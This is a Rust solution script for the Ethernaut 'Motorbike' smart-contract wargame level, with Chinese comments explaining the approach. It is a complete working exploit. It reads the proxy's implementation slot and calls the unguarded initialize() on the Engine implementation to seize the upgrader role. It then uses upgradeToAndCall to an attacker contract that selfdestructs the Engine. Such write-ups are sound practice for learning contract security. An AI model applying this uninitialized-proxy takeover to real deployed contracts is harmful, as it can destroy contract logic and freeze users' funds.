#[allow(unused_imports)]
use alloy::{
    sol_types::SolCall,
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        keccak256,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract Motor {
        
    }
    
    #[sol(rpc)]
    contract Engine {
        function upgrader() external view returns (address);

        function initialize() external;
        function upgradeToAndCall(address newImplementation, bytes data) external payable;
    }

    #[sol(rpc)]
    contract Exp {
        function die(address payable target) external;
    }
}

use crate::ethernaut;
// use crate::utils;
use crate::macros::wait_tx;
use tokio::runtime::Runtime;


#[allow(dead_code)]
pub fn level25_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level25())?;
    
    Ok(())
}

async fn level25() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let implementation = U256::from_str_radix(
    "360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc",
    16
    )?;
    let motor_address = "0x3F4e2fe42676b74B8F77eF92ebc28E29467E15ea".parse()?;
    let _motor = Motor::new(motor_address, provider.clone());
    let slot = provider.get_storage_at(
        motor_address,
        implementation
    ).await?;
    let engine_address = Address::from_slice(&slot.to_be_bytes::<32>()[12..]);
    let engine = Engine::new(engine_address, provider.clone());
    let exp_address: Address = "0x3Af53F2b2BD44696537A57CC1244e0B41549D00F".parse()?;
    let alice: Address = ethernaut::ALICE.parse()?;
    
    println!("[CHECK]");
    println!("    engine = {}", engine_address);
    println!("    upgrader = {}", engine.upgrader().call().await?);
    println!("    implementation = {:#x}\n", provider.get_storage_at(engine_address, implementation).await?);

    let ini_tx = engine.initialize()
        .send()
        .await?;
    let _ = wait_tx!(ini_tx, "Engine.initialize()");
    
    println!("[CHECK]");
    println!("    upgrader = {}\n", engine.upgrader().call().await?);

    let data = Bytes::from(Exp::dieCall {target: alice}.abi_encode());
    let upgrade_tx = engine.upgradeToAndCall(
        exp_address,
        data
    )
        .send()
        .await?;
    let _ = wait_tx!(upgrade_tx, "Engine.upgradeToAndCall()");

    println!("[CHECK]");
    let code = provider.get_code_at(engine_address).await?;
    if code.is_empty() {
        println!("    Selfdestruct success.");
    } else {
        println!("    Selfdestruct failure. (code length = {})", code.len());
    }
    
    Ok(())
}

/*
解题思路:
- Engine本身的upgrader是不确定的, 这个应该是可以绕过的
- initialize()函数没有权限控制, 可以直接调用, 然后修改upgrader (因为初始化的是Motor, Engine没有被初始化)
- 如果直接对Engine调用upgrade的话, delegatecall就是针对Engine自身的了, 如果new logic是攻击合约并且执行selfdestruct的话, 就可以让engine自会

新的解题思路:
- 因为使用delegatecall, 所以实际上只有motor被init了, Engine没有被init
- 可以调用Engine的initialize()函数, 获取upgrader权限
- 
*/


